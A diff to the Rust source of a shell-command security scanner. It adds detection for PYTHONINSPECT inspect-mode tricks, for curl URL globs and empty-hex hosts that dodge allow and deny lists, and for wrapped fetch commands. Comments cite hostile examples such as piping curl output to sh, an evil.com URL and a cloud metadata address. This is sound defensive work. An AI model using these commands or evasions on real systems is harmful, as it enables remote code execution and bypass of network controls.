@@ -859,14 +859,41 @@ fn command_analysis_work_budget_finding(boundary: &str) -> Finding {
     }
 }
 
-/// Run command-shape rules.
+/// Run command-shape rules for a command whose environment has no inherited
+/// `PYTHONINSPECT` (see [`check_with_inherited_python_inspect`]).
 pub fn check(
     input: &str,
     shell: ShellType,
     cwd: Option<&str>,
     scan_context: ScanContext,
 ) -> Vec<Finding> {
-    check_depth(input, shell, cwd, scan_context, 0, true)
+    check_with_inherited_python_inspect(input, shell, cwd, scan_context, false)
+}
+
+/// Run command-shape rules. `inherited_python_inspect` says whether the
+/// environment the command will run in already has a non-empty
+/// `PYTHONINSPECT`. The caller decides it (a daemon analyzes for other
+/// processes, so its own environment is irrelevant); rules never read the
+/// process environment themselves.
+pub fn check_with_inherited_python_inspect(
+    input: &str,
+    shell: ShellType,
+    cwd: Option<&str>,
+    scan_context: ScanContext,
+    inherited_python_inspect: bool,
+) -> Vec<Finding> {
+    check_depth(
+        input,
+        shell,
+        cwd,
+        scan_context,
+        0,
+        true,
+        PythonInspectContext {
+            may_enable: inherited_python_inspect,
+            allexport: false,
+        },
+    )
 }
 
 fn check_depth(
@@ -876,6 +903,7 @@ fn check_depth(
     scan_context: ScanContext,
     depth: usize,
     analyze_flow: bool,
+    inherited_inspect: PythonInspectContext,
 ) -> Vec<Finding> {
     let mut findings = Vec::new();
     let (input, segments, mut command_budget_exhausted) =
@@ -916,7 +944,7 @@ fn check_depth(
             || s.preceding_separator.as_deref() == Some("|&")
     });
     if has_pipe {
-        check_pipe_to_interpreter(&segments, shell, &mut findings);
+        check_pipe_to_interpreter(&segments, shell, inherited_inspect, &mut findings);
     }
 
     // source/. reuse transport rules: they execute the fetched body.
@@ -945,7 +973,7 @@ fn check_depth(
     }
 
     check_env_var_in_command(&segments, &mut findings);
-    check_network_destination(&segments, &mut findings);
+    check_network_destination(&segments, shell, &mut findings);
     check_base64_decode_execute(&segments, shell, &mut findings);
     if analyze_flow {
         let _ = check_data_exfiltration(&segments, shell, &mut findings);
@@ -1054,7 +1082,10 @@ fn check_depth(
             mitre_id: None,
             custom_rule_id: None,
         });
-    } else {
+    } else if !nested.is_empty() {
+        // A nested body runs with the environment the enclosing command set up
+        // (`export PYTHONINSPECT=1; (… | python3 -c …)`).
+        let nested_inspect = inherited_inspect.extend(&segments, shell);
         for body in nested {
             findings.extend(check_depth(
                 &body.input,
@@ -1063,6 +1094,7 @@ fn check_depth(
                 scan_context,
                 depth + 1,
                 false,
+                nested_inspect,
             ));
         }
     }
@@ -3161,10 +3193,13 @@ fn python_body_is_known_data_parser(body: &str) -> bool {
 /// fail the direct-leader check, and bare `python` / `python -` have no `-c` body
 /// (stdin IS the program), so all of those keep the pipe-to-interpreter finding.
 fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> bool {
-    // This proof is for an actual POSIX pipe, whose stdin is not a terminal.
-    // Other shells and any redirection keep the ordinary interpreter finding.
-    // In particular, do not let stdin be redirected to a terminal where
-    // PYTHONINSPECT can enable a REPL after the fixed program exits.
+    // This proof is for an actual POSIX pipe with no redirection. Other shells
+    // and any redirection keep the ordinary interpreter finding. A leading
+    // assignment is refused because it may set PYTHONINSPECT (or another
+    // interpreter-control variable) for this one process: inspect mode starts a
+    // REPL after the fixed program exits, and that REPL reads the REST OF THE
+    // PIPE as code. Assignments elsewhere in the input are checked by the
+    // caller (`PythonInspectContext::extend`).
     if shell != ShellType::Posix
         || !tokenize::leading_env_assignments(&seg.raw).is_empty()
         || seg.args.iter().any(|arg| {
@@ -3189,11 +3224,320 @@ fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> 
     python_body_is_literal_output(&body) || python_body_is_known_data_parser(&body)
 }
 
+/// Interpreters that directly receive a URL-fetch command's output through a
+/// pipe (`curl … | sh`), with the same tokenizer and interpreter resolution
+/// (`sudo`/`env` wrappers, flags, redirections) as the pipe-to-interpreter rule.
+/// The fetch command must be the literal pipe source: `echo curl … | sh` is not
+/// a download.
+pub(crate) fn fetch_piped_interpreters(input: &str, shell: ShellType) -> Vec<String> {
+    let segments = tokenize::tokenize(input, shell);
+    let mut interpreters = Vec::new();
+    for (index, seg) in segments.iter().enumerate().skip(1) {
+        if !matches!(seg.preceding_separator.as_deref(), Some("|" | "|&")) {
+            continue;
+        }
+        let source_is_fetch = segments[index - 1]
+            .command
+            .as_deref()
+            .is_some_and(|command| is_url_fetch_command(&normalize_cmd_base(command, shell)));
+        if !source_is_fetch {
+            continue;
+        }
+        if let (Some(interpreter), _) = resolve_interpreter_name_tracking(seg, shell) {
+            interpreters.push(interpreter);
+        }
+    }
+    interpreters
+}
+
+/// Shell builtins that can put a variable into the environment of later
+/// commands in the same shell.
+const ENV_EXPORTING_BUILTINS: &[&str] = &[
+    "export", "declare", "typeset", "readonly", "local", "integer", "float", "builtin", "command",
+];
+
+/// Builtins that assign a variable whose NAME is one of their words. With
+/// allexport on (possibly set before this input was typed) the assignment is
+/// exported, so a non-literal name may be PYTHONINSPECT.
+const NAME_ASSIGNING_BUILTINS: &[&str] = &[
+    "read",
+    "mapfile",
+    "readarray",
+    "getopts",
+    "let",
+    "vared",
+    "zparseopts",
+    "sysread",
+    "zstat",
+];
+
+/// Builtins that assign a named variable only with one option:
+/// `printf -v NAME`, zsh `print -v NAME`, `wait -p NAME`, `strftime -s NAME`.
+const OPTION_ASSIGNING_BUILTINS: &[(&str, &str)] = &[
+    ("printf", "-v"),
+    ("print", "-v"),
+    ("wait", "-p"),
+    ("strftime", "-s"),
+];
+
+/// Commands whose short flags can turn on allexport (`set -a`, `bash -a -c`).
+const ALLEXPORT_FLAG_COMMANDS: &[&str] = &[
+    "set", "setopt", "sh", "bash", "zsh", "dash", "ksh", "mksh", "ash",
+];
+
+/// Words that start a new command inside the same tokenizer segment.
+const COMMAND_START_WORDS: &[&str] = &[
+    "!", "time", "if", "then", "elif", "else", "do", "while", "until", "function",
+];
+
+const MAX_PYTHON_INSPECT_EVAL_DEPTH: usize = 2;
+
+/// What a checked command (and the commands enclosing it) may have done to
+/// the environment of a later `python -c` pipe sink. Nested bodies (groups,
+/// substitutions, `sh -c`, `eval`) inherit the enclosing command's context,
+/// because they run with the environment it set up.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+struct PythonInspectContext {
+    /// PYTHONINSPECT may be set in the environment.
+    may_enable: bool,
+    /// allexport may be on, so any assignment may be exported.
+    allexport: bool,
+}
+
+impl PythonInspectContext {
+    /// This context plus whatever `segments` may do.
+    fn extend(self, segments: &[tokenize::Segment], shell: ShellType) -> Self {
+        let allexport = self.allexport || segments_may_enable_allexport(segments, shell);
+        let may_enable =
+            self.may_enable || segments_may_enable_python_inspect(segments, shell, 0, allexport);
+        Self {
+            may_enable,
+            allexport,
+        }
+    }
+}
+
+/// Whether anything in the input may turn on the shell's allexport option:
+/// a literal `allexport` / `ALL_EXPORT` option name anywhere (`set -o`,
+/// `setopt`, `shopt -o`), a short flag word containing `a` after `set`,
+/// `setopt` or a shell name (`set -ea`, `bash -a -c`), or a non-literal word
+/// after one of them (`set -$FLAGS`). Conservative: `set +a` also counts.
+fn segments_may_enable_allexport(segments: &[tokenize::Segment], shell: ShellType) -> bool {
+    segments.iter().any(|seg| {
+        let mut after_flag_command = false;
+        for word in seg.command.iter().chain(seg.args.iter()) {
+            let word = word.trim_start_matches(['(', '{']);
+            if word.is_empty() {
+                continue;
+            }
+            if !command_word_is_statically_bound(word, shell) {
+                if after_flag_command {
+                    return true;
+                }
+                continue;
+            }
+            for token in normalize_shell_token(word, shell).split_whitespace() {
+                let folded = token.replace('_', "").to_ascii_lowercase();
+                if folded.contains("allexport") {
+                    return true;
+                }
+                if after_flag_command
+                    && token.len() > 1
+                    && token.starts_with(['-', '+'])
+                    && !token.starts_with("--")
+                    && token[1..].contains('a')
+                {
+                    return true;
+                }
+                if ALLEXPORT_FLAG_COMMANDS.contains(&normalize_cmd_base(token, shell).as_str()) {
+                    after_flag_command = true;
+                }
+            }
+        }
+        false
+    })
+}
+
+/// Whether anything in the segments may turn on Python's inspect mode for a
+/// later `python -c` pipe sink. Inspect mode runs the rest of the piped stdin
+/// as code after the fixed program exits, so the issue #136 data-pipeline
+/// exemption must not apply.
+///
+/// Conservative by design: a literal `PYTHONINSPECT` anywhere, a dynamic
+/// command name, `eval`/`trap` with a dynamic word (a literal body is checked
+/// recursively), `source`/`.`/`alias`/`enable` at a command start, an exporting or
+/// name-assigning builtin with any non-literal word, or any non-literal word
+/// while allexport may be on all refuse the exemption. Pipeline stages run in
+/// subshells, but the check does not rely on that. Shell state from before
+/// this input was typed (functions, aliases, an already-on allexport) cannot
+/// be seen here, apart from an inherited PYTHONINSPECT (the caller's
+/// `inherited_python_inspect`, carried in [`PythonInspectContext`]).
+fn segments_may_enable_python_inspect(
+    segments: &[tokenize::Segment],
+    shell: ShellType,
+    depth: usize,
+    allexport: bool,
+) -> bool {
+    segments
+        .iter()
+        .any(|seg| segment_may_enable_python_inspect(seg, shell, depth, allexport))
+}
+
+fn segment_may_enable_python_inspect(
+    seg: &tokenize::Segment,
+    shell: ShellType,
+    depth: usize,
+    allexport: bool,
+) -> bool {
+    // A direct `python -c` with an inert literal body (the issue #136 proof)
+    // and a literal `unset` run nothing that could change the shell's
+    // environment, even when they mention PYTHONINSPECT (`unset PYTHONINSPECT`
+    // turns inspect mode off).
+    if is_python_dash_c_data_pipeline(seg, shell) || segment_is_literal_unset(seg, shell) {
+        return false;
+    }
+    if seg.raw.contains("PYTHONINSPECT") {
+        return true;
+    }
+    let words: Vec<&str> = seg
+        .command
+        .iter()
+        .chain(seg.args.iter())
+        .map(|word| word.trim_start_matches(['(', '{']))
+        .filter(|word| !word.is_empty())
+        .collect();
+    if words
+        .first()
+        .is_some_and(|first| !command_name_is_statically_bound(first, shell))
+    {
+        return true;
+    }
+    let has_dynamic_word = words
+        .iter()
+        .any(|word| !command_word_is_statically_bound(word, shell));
+    if allexport && has_dynamic_word {
+        return true;
+    }
+    // `strict`: any non-literal word may name the assigned variable.
+    // `exporting_at`: only a non-literal NAME may (`export PATH="$HOME/bin"`
+    // exports PATH whatever its value).
+    let mut strict = false;
+    let mut exporting_at = None;
+    let mut eval_at = None;
+    for (index, word) in words.iter().enumerate() {
+        if !command_word_is_statically_bound(word, shell) {
+            continue;
+        }
+        let normalized = normalize_shell_token(word, shell);
+        if normalized.contains("PYTHONINSPECT") {
+            return true;
+        }
+        // A word ending in `)` before this one is a case pattern (`*)`), a
+        // function header (`f()`, `f ()`), or the end of a group; each starts a
+        // new command. `{` was trimmed above, so `f () { . x; }` lands here too.
+        let at_command_start = index == 0 || {
+            let previous = normalize_shell_token(words[index - 1], shell);
+            COMMAND_START_WORDS.contains(&previous.as_str())
+                || ENV_EXPORTING_BUILTINS.contains(&previous.as_str())
+                || previous.ends_with(')')
+        };
+        match normalized.as_str() {
+            "source" | "." | "alias" | "enable" if at_command_start => return true,
+            // `trap` runs its action like `eval` (a DEBUG trap runs it before
+            // every later command), so its body is checked the same way.
+            "eval" | "trap" => {
+                eval_at.get_or_insert(index);
+            }
+            base if ENV_EXPORTING_BUILTINS.contains(&base) => {
+                exporting_at.get_or_insert(index);
+            }
+            base if NAME_ASSIGNING_BUILTINS.contains(&base) => strict = true,
+            base => {
+                if let Some((_, option)) = OPTION_ASSIGNING_BUILTINS
+                    .iter()
+                    .find(|(builtin, _)| *builtin == base)
+                {
+                    strict |= words[index + 1..]
+                        .iter()
+                        .any(|arg| normalize_shell_token(arg, shell).starts_with(option));
+                }
+            }
+        }
+    }
+    if let Some(exporting_at) = exporting_at {
+        let after = &words[exporting_at + 1..];
+        // A nameref (`declare -n r="$V"`) makes later assignments to `r` set
+        // the variable named by the value, so its value is a name too.
+        let nameref = after.iter().any(|word| {
+            command_word_is_statically_bound(word, shell) && {
+                let word = normalize_shell_token(word, shell);
+                word.starts_with(['-', '+']) && !word.starts_with("--") && word.contains('n')
+            }
+        });
+        let dynamic_name = words.iter().any(|word| {
+            !command_word_is_statically_bound(word, shell)
+                && (nameref || !word_assigns_literal_name(word))
+        });
+        if dynamic_name {
+            return true;
+        }
+    }
+    if !strict && eval_at.is_none() {
+        return false;
+    }
+    if has_dynamic_word {
+        return true;
+    }
+    let Some(eval_at) = eval_at else {
+        return false;
+    };
+    if depth >= MAX_PYTHON_INSPECT_EVAL_DEPTH {
+        return true;
+    }
+    // Leading option words (`eval --`, `trap -- ...`) are not part of the body.
+    let body = words[eval_at + 1..]
+        .iter()
+        .map(|word| normalize_shell_token(word, shell))
+        .skip_while(|word| word.starts_with('-'))
+        .collect::<Vec<_>>()
+        .join(" ");
+    let body_segments = tokenize::tokenize(&body, shell);
+    let allexport = allexport || segments_may_enable_allexport(&body_segments, shell);
+    segments_may_enable_python_inspect(&body_segments, shell, depth + 1, allexport)
+}
+
+/// `NAME=value` or `NAME+=value` with a literal identifier NAME, whatever
+/// the value (`PATH="$HOME/bin:$PATH"`). Quoted or expanded names do not count.
+fn word_assigns_literal_name(word: &str) -> bool {
+    let name_len = word
+        .bytes()
+        .take_while(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
+        .count();
+    let (name, rest) = word.split_at(name_len);
+    !name.is_empty()
+        && !name.as_bytes()[0].is_ascii_digit()
+        && name != "PYTHONINSPECT"
+        && (rest.starts_with('=') || rest.starts_with("+="))
+}
+
+/// A plain `unset` of literal names (no prefix assignment, no expansion). It
+/// can only remove variables, never set one.
+fn segment_is_literal_unset(seg: &tokenize::Segment, shell: ShellType) -> bool {
+    seg.command.as_deref() == Some("unset")
+        && tokenize::leading_env_assignments(&seg.raw).is_empty()
+        && seg
+            .args
+            .iter()
+            .all(|arg| command_word_is_statically_bound(arg, shell) && !arg.contains('='))
+}
+
 fn check_pipe_to_interpreter(
     segments: &[tokenize::Segment],
     shell: ShellType,
+    inherited_inspect: PythonInspectContext,
     findings: &mut Vec<Finding>,
 ) {
+    let mut inspect_may_be_enabled = None;
     for (i, seg) in segments.iter().enumerate() {
         if i == 0 {
             continue;
@@ -3215,6 +3559,9 @@ fn check_pipe_to_interpreter(
                     // blocking via the fetch-source path below.
                     if !is_url_fetch_command(&source_base)
                         && is_python_dash_c_data_pipeline(seg, shell)
+                        && !inspect_may_be_enabled
+                            .get_or_insert_with(|| inherited_inspect.extend(segments, shell))
+                            .may_enable
                     {
                         continue;
                     }
@@ -3947,7 +4294,16 @@ fn check_host_for_network_issues(arg: &str, client: &str, findings: &mut Vec<Fin
     } else {
         extract_host_from_arg(arg)
     };
-    if let Some(host) = host {
+    let Some(host) = host else {
+        return;
+    };
+    // A curl empty-hex host is also evaluated as the numeric address that a
+    // libc `inet_aton` resolver reads from the same spelling.
+    let numeric_reading = (client == "curl")
+        .then(|| crate::parse::curl_empty_hex_numeric_reading(&host))
+        .flatten()
+        .map(|address| address.to_string());
+    for host in std::iter::once(host).chain(numeric_reading) {
         if METADATA_ENDPOINTS.contains(&host.as_str()) {
             findings.push(Finding {
                 rule_id: RuleId::MetadataEndpoint,
@@ -3986,17 +4342,163 @@ fn check_host_for_network_issues(arg: &str, client: &str, findings: &mut Vec<Fin
     }
 }
 
-fn check_network_destination(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
-    for segment in segments {
-        let Some(ref cmd) = segment.command else {
+/// The destinations of one curl URL operand under curl's URL globbing.
+enum CurlOperandHosts {
+    /// Globbing is off, or the host part holds no glob.
+    Plain,
+    /// The operand once per distinct expansion of its host part.
+    Expanded(Vec<String>),
+    /// A host-part glob tirith cannot expand within its bounds.
+    Unreadable,
+}
+
+/// `budget` is the number of expanded host parts one command may still
+/// check (see [`crate::extract::MAX_CURL_GLOB_EXPANSIONS_PER_COMMAND`]); a
+/// globbed operand past it is unreadable.
+fn curl_operand_hosts(
+    args: &[String],
+    operand: &FetchDestination,
+    shell: ShellType,
+    budget: &mut usize,
+) -> CurlOperandHosts {
+    if !curl_globbing_enabled(args, shell) {
+        return CurlOperandHosts::Plain;
+    }
+    match crate::extract::curl_host_glob(&operand.text, operand.curl_variables) {
+        crate::extract::CurlHostGlob::Plain => CurlOperandHosts::Plain,
+        crate::extract::CurlHostGlob::Expanded(expansions) if expansions.len() <= *budget => {
+            *budget -= expansions.len();
+            CurlOperandHosts::Expanded(expansions)
+        }
+        crate::extract::CurlHostGlob::Expanded(_) | crate::extract::CurlHostGlob::Unreadable => {
+            CurlOperandHosts::Unreadable
+        }
+    }
+}
+
+/// Whether curl expands `[...]` / `{...}` globs in these arguments' URLs: on
+/// unless `-g` / `--globoff` (also inside a cluster of short flags such as
+/// `-sg`) turns it off; a later `--no-globoff` turns it back on. With `--next`
+/// (`-:`) options apply to one URL group each, so globbing is taken as on.
+pub(crate) fn curl_globbing_enabled(args: &[String], shell: ShellType) -> bool {
+    let mut enabled = true;
+    let mut takes_value = false;
+    for arg in args {
+        let word = normalize_shell_token(arg, shell);
+        if std::mem::take(&mut takes_value) {
             continue;
+        }
+        if word == "--" {
+            break;
+        }
+        if !word.starts_with('-') || word == "-" {
+            continue;
+        }
+        match word.as_str() {
+            "--next" => return true,
+            "--globoff" => {
+                enabled = false;
+                continue;
+            }
+            "--no-globoff" => {
+                enabled = true;
+                continue;
+            }
+            _ => {}
+        }
+        let value = fetch_option_value("curl", &word);
+        takes_value = value.as_ref().is_some_and(|value| value.attached.is_none());
+        if word.starts_with("--") {
+            continue;
+        }
+        // Short flags before the first value-taking letter of the cluster.
+        let flags_end = match value.and_then(|value| value.attached) {
+            Some(attached) => word.len() - attached.len() - 1,
+            None if takes_value => word.len() - 1,
+            None => word.len(),
         };
-        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
+        let flags = word.get(1..flags_end).unwrap_or_default();
+        if flags.contains(':') {
+            return true;
+        }
+        if flags.contains('g') {
+            enabled = false;
+        }
+    }
+    enabled
+}
+
+fn curl_glob_unreadable_finding(operand: &str) -> Finding {
+    Finding {
+        rule_id: RuleId::AnalysisIncomplete,
+        severity: Severity::High,
+        title: "curl URL glob in the host could not be checked".to_string(),
+        description: "curl expands `[...]` ranges and `{...}` sets in a URL (unless `-g` / \
+                      `--globoff` is given), so this operand may reach hosts that are not \
+                      written out. Its host part expands to more destinations than tirith \
+                      checks, or uses a glob tirith cannot read. An allowlist entry does not \
+                      cover it, since the hosts it reaches are unknown. List the hosts, or pass \
+                      `-g` when the brackets are literal."
+            .to_string(),
+        // Text, not URL evidence: the written operand says nothing reliable
+        // about the hosts curl reaches, so URL allowlist entries and trusted
+        // targets must not drop the finding.
+        evidence: vec![Evidence::Text {
+            detail: format!("curl URL operand: {operand}"),
+        }],
+        human_view: None,
+        agent_view: None,
+        mitre_id: None,
+        custom_rule_id: None,
+    }
+}
+
+fn check_network_destination(
+    segments: &[tokenize::Segment],
+    shell: ShellType,
+    findings: &mut Vec<Finding>,
+) {
+    for segment in segments {
+        // Read through execution wrappers (`sudo`, `env`, `nohup`, `command`)
+        // as the URL extractor and the network policy do. A chain that cannot
+        // be resolved keeps the segment's own command word.
+        let (cmd_base, args) =
+            match crate::extract::resolve_wrapped_command_for_shell(segment, shell) {
+                Some((name, args)) => (name.to_lowercase(), args),
+                None => {
+                    let Some(ref cmd) = segment.command else {
+                        continue;
+                    };
+                    (
+                        cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase(),
+                        segment.args.clone(),
+                    )
+                }
+            };
         if !is_source_command(&cmd_base) {
             continue;
         }
 
-        for arg in &segment.args {
+        // curl expands URL globs: `http://169.254.169.[254-254]/` and
+        // `http://{10.0.0.1,x}/` reach the hosts they expand to.
+        if cmd_base == "curl" {
+            let mut budget = crate::extract::MAX_CURL_GLOB_EXPANSIONS_PER_COMMAND;
+            for operand in curl_url_operands(&args, shell) {
+                match curl_operand_hosts(&args, &operand, shell, &mut budget) {
+                    CurlOperandHosts::Plain => {}
+                    CurlOperandHosts::Expanded(expansions) => {
+                        for expansion in expansions {
+                            check_host_for_network_issues(&expansion, "curl", findings);
+                        }
+                    }
+                    CurlOperandHosts::Unreadable => {
+                        findings.push(curl_glob_unreadable_finding(&operand.text));
+                    }
+                }
+            }
+        }
+
+        for arg in &args {
             let trimmed = arg.trim().trim_matches(|c: char| c == '\'' || c == '"');
             if trimmed.starts_with('-') {
                 // `--url=http://evil.com` style — URL is wedged into the flag value.
@@ -4062,16 +4564,43 @@ fn extract_client_destination_host(client: &str, arg: &str) -> Option<String> {
     }
 }
 
+/// How a network list is used, which decides how two readings of one host
+/// combine: a deny list matches if EITHER reading matches, an allow list only
+/// if BOTH do.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum NetworkListUse {
+    Allow,
+    Deny,
+}
+
 /// The raw policy entry is interpreted in the same client authority context.
-/// A DNS name containing an empty hex component must not inherit a numeric
-/// loopback/CIDR allow entry, or lose an exact DNS deny entry, during matching.
-fn matches_client_network_list(client: &str, host: &str, list: &[String]) -> bool {
+/// A curl host with an empty hex component is a DNS name for curl 8.7.1 and a
+/// numeric address for resolvers that use libc `inet_aton`. Both readings are
+/// evaluated: a numeric CIDR/IP deny still applies, a DNS deny is not lost, and
+/// an allow entry admits the destination only if it covers both readings.
+fn matches_client_network_list(
+    client: &str,
+    host: &str,
+    list: &[String],
+    list_use: NetworkListUse,
+) -> bool {
     let dns_host = (client == "curl")
         .then(|| crate::parse::curl_empty_hex_dns_host(host))
         .flatten();
-    let Some(host) = dns_host else {
+    let Some(dns_host) = dns_host else {
         return matches_network_list(host, list);
     };
+    let numeric_match = crate::parse::curl_empty_hex_numeric_reading(host)
+        .is_some_and(|address| matches_network_list(&address.to_string(), list));
+    let dns_match = matches_dns_reading(&dns_host, list);
+    match list_use {
+        NetworkListUse::Allow => dns_match && numeric_match,
+        NetworkListUse::Deny => dns_match || numeric_match,
+    }
+}
+
+/// DNS reading of a curl empty-hex host against a network list.
+fn matches_dns_reading(host: &str, list: &[String]) -> bool {
     let host = host.trim_end_matches('.');
     list.iter().any(|entry| {
         let entry = entry.trim().trim_start_matches('.');
@@ -4408,18 +4937,28 @@ fn powershell_option_kind(name: &str) -> Option<FetchOptionValueKind> {
     }
 }
 
+/// curl 8.3+ reads `--expand-<option> VALUE` as `--<option>` with the
+/// `{{name}}` references to `--variable` values in VALUE replaced first.
+const CURL_EXPAND_OPTION_PREFIX: &str = "--expand-";
+
 fn fetch_option_value<'a>(command: &str, token: &'a str) -> Option<FetchOptionValue<'a>> {
     match command {
         "curl" => {
-            if token.starts_with("--") {
-                let (name, attached) = split_attached_option(token, '=');
+            if let Some(long) = token.strip_prefix("--") {
+                let (name, attached) = split_attached_option(long, '=');
+                let name = name.strip_prefix("expand-").unwrap_or(name);
+                let listed = |options: &[&str]| {
+                    options
+                        .iter()
+                        .any(|option| option.strip_prefix("--") == Some(name))
+                };
                 let kind = match name {
-                    "--connect-to" => FetchOptionValueKind::CurlConnectTo,
-                    "--resolve" => FetchOptionValueKind::CurlResolve,
-                    _ if CURL_DESTINATION_VALUE_OPTIONS.contains(&name) => {
+                    "connect-to" => FetchOptionValueKind::CurlConnectTo,
+                    "resolve" => FetchOptionValueKind::CurlResolve,
+                    _ if listed(CURL_DESTINATION_VALUE_OPTIONS) => {
                         FetchOptionValueKind::Destination
                     }
-                    _ if CURL_NON_DESTINATION_VALUE_OPTIONS.contains(&name) => {
+                    _ if listed(CURL_NON_DESTINATION_VALUE_OPTIONS) => {
                         FetchOptionValueKind::NonDestination
                     }
                     _ => return None,
@@ -4589,24 +5128,38 @@ fn httpie_proxy_peer(value: &str) -> &str {
     }
 }
 
+/// A destination operand of a URL-fetching command, after quote removal.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct FetchDestination {
+    pub(crate) text: String,
+    /// The value of a curl `--expand-<option>`: curl replaces each
+    /// `{{name}}` in it with a `--variable` value before it reads the URL.
+    pub(crate) curl_variables: bool,
+}
+
 fn push_fetch_option_destinations(
-    destinations: &mut Vec<String>,
+    destinations: &mut Vec<FetchDestination>,
     kind: FetchOptionValueKind,
     value: &str,
     include_mapped_peers: bool,
+    curl_variables: bool,
 ) {
+    let mut push = |text: &str| {
+        destinations.push(FetchDestination {
+            text: text.to_string(),
+            curl_variables,
+        })
+    };
     match kind {
-        FetchOptionValueKind::Destination => destinations.push(value.to_string()),
-        FetchOptionValueKind::HttpieProxy => {
-            destinations.push(httpie_proxy_peer(value).to_string())
-        }
+        FetchOptionValueKind::Destination => push(value),
+        FetchOptionValueKind::HttpieProxy => push(httpie_proxy_peer(value)),
         FetchOptionValueKind::CurlConnectTo if include_mapped_peers => {
             if let Some(peer) = curl_connect_to_peer(value) {
-                destinations.push(peer.to_string());
+                push(peer);
             }
         }
         FetchOptionValueKind::CurlResolve if include_mapped_peers => {
-            destinations.extend(curl_resolve_peers(value).into_iter().map(str::to_string))
+            curl_resolve_peers(value).into_iter().for_each(push)
         }
         FetchOptionValueKind::CurlConnectTo
         | FetchOptionValueKind::CurlResolve
@@ -4616,11 +5169,15 @@ fn push_fetch_option_destinations(
 
 /// URL-like curl operands for extraction. Connection/DNS mapping fields remain
 /// network-policy peers, but are not themselves scheme-less URL operands.
-pub(crate) fn curl_url_operands(args: &[String], shell: ShellType) -> Vec<String> {
+pub(crate) fn curl_url_operands(args: &[String], shell: ShellType) -> Vec<FetchDestination> {
     fetch_destination_operands("curl", args, shell, false)
 }
 
-fn url_fetch_destination_operands(command: &str, args: &[String], shell: ShellType) -> Vec<String> {
+fn url_fetch_destination_operands(
+    command: &str,
+    args: &[String],
+    shell: ShellType,
+) -> Vec<FetchDestination> {
     fetch_destination_operands(command, args, shell, true)
 }
 
@@ -4629,19 +5186,22 @@ fn fetch_destination_operands(
     args: &[String],
     shell: ShellType,
     include_mapped_peers: bool,
-) -> Vec<String> {
+) -> Vec<FetchDestination> {
     let mut destinations = Vec::new();
     let mut pending = None;
     let mut options_terminated = false;
 
-    for arg in args {
+    // A redirection (`> 'report[1].json'`, `2>err.log`, `< in.txt`) and its
+    // target belong to the shell: the client never reads them as operands.
+    for arg in &crate::escalation::args_without_redirections(args) {
         let normalized = normalize_shell_token(arg, shell);
-        if let Some(kind) = pending.take() {
+        if let Some((kind, curl_variables)) = pending.take() {
             push_fetch_option_destinations(
                 &mut destinations,
                 kind,
                 &normalized,
                 include_mapped_peers,
+                curl_variables,
             );
             continue;
         }
@@ -4657,20 +5217,26 @@ fn fetch_destination_operands(
             };
         if !options_terminated && option_spelling.starts_with('-') && option_spelling != "-" {
             if let Some(option) = fetch_option_value(command, &option_spelling) {
+                let curl_variables =
+                    command == "curl" && option_spelling.starts_with(CURL_EXPAND_OPTION_PREFIX);
                 match (option.kind, option.attached) {
                     (kind, Some(value)) if !value.is_empty() => push_fetch_option_destinations(
                         &mut destinations,
                         kind,
                         value,
                         include_mapped_peers,
+                        curl_variables,
                     ),
                     (_, Some(_)) => {}
-                    (kind, None) => pending = Some(kind),
+                    (kind, None) => pending = Some((kind, curl_variables)),
                 }
             }
             continue;
         }
-        destinations.push(normalized);
+        destinations.push(FetchDestination {
+            text: normalized,
+            curl_variables: false,
+        });
     }
     destinations
 }
@@ -4792,14 +5358,34 @@ pub fn check_network_policy(
         }
 
         if is_url_fetch_command(&cmd_base) {
+            let mut budget = crate::extract::MAX_CURL_GLOB_EXPANSIONS_PER_COMMAND;
             for destination in url_fetch_destination_operands(&cmd_base, resolved_args, shell) {
-                let Some(host) = extract_client_destination_host(&cmd_base, &destination) else {
-                    continue;
+                // A curl URL glob reaches every host it expands to: the
+                // operand is denied if any of them is denied and not allowed,
+                // so the allow list admits it only if it covers each of them.
+                let hosts: Vec<String> = match (cmd_base == "curl")
+                    .then(|| curl_operand_hosts(resolved_args, &destination, shell, &mut budget))
+                {
+                    Some(CurlOperandHosts::Unreadable) => {
+                        // Its hosts are unknown: report it and go on, so a
+                        // denied destination after it is still found.
+                        findings.push(curl_glob_unreadable_finding(&destination.text));
+                        continue;
+                    }
+                    Some(CurlOperandHosts::Expanded(expansions)) => expansions
+                        .iter()
+                        .filter_map(|expansion| extract_client_destination_host("curl", expansion))
+                        .collect(),
+                    Some(CurlOperandHosts::Plain) | None => {
+                        extract_client_destination_host(&cmd_base, &destination.text)
+                            .into_iter()
+                            .collect()
+                    }
                 };
-                if matches_client_network_list(&cmd_base, &host, allow) {
-                    continue;
-                }
-                if matches_client_network_list(&cmd_base, &host, deny) {
+                if let Some(host) = hosts.iter().find(|host| {
+                    !matches_client_network_list(&cmd_base, host, allow, NetworkListUse::Allow)
+                        && matches_client_network_list(&cmd_base, host, deny, NetworkListUse::Deny)
+                }) {
                     findings.push(Finding {
                         rule_id: RuleId::CommandNetworkDeny,
                         severity: Severity::Critical,
@@ -4807,7 +5393,9 @@ pub fn check_network_policy(
                         description: format!(
                             "Command accesses {host}, which is on the network deny list"
                         ),
-                        evidence: vec![Evidence::Url { raw: destination }],
+                        evidence: vec![Evidence::Url {
+                            raw: destination.text,
+                        }],
                         human_view: None,
                         agent_view: None,
                         mitre_id: None,
@@ -4829,10 +5417,10 @@ pub fn check_network_policy(
             }
             if let Some(spec) = crate::extract::parse_scp_remote_spec(trimmed, shell) {
                 let host = spec.host;
-                if matches_client_network_list(&cmd_base, &host, allow) {
+                if matches_client_network_list(&cmd_base, &host, allow, NetworkListUse::Allow) {
                     continue;
                 }
-                if matches_client_network_list(&cmd_base, &host, deny) {
+                if matches_client_network_list(&cmd_base, &host, deny, NetworkListUse::Deny) {
                     findings.push(Finding {
                         rule_id: RuleId::CommandNetworkDeny,
                         severity: Severity::Critical,
@@ -8587,7 +9175,11 @@ fn upload_option_role<'a>(command: &str, token: &'a str) -> Option<UploadOptionR
                 attached,
             });
         }
-        if fetch_option_value(command, token).is_some() {
